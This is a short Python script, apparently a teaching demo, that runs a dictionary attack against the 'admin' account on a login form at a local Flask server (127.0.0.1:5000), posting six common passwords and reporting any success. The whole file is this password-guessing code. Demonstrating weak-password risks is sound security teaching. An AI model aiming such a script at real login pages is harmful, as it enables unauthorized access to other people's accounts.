# brute_force_demo.py
import requests

URL = "http://127.0.0.1:5000/"  # Flask server address
USERNAME = "admin"
WORDLIST = ["123456", "password", "admin123",
            "letmein", "hunter2", "password1"]

for password in WORDLIST:
    response = requests.post(
        URL, data={"username": USERNAME, "password": password})
    print(f"Trying password: {password}")
    if "Login Successful" in response.text:
        print(f"\n✅ SUCCESS! The password is: {password}")
        break
else:
    print("\n❌ Failed to guess the password.")
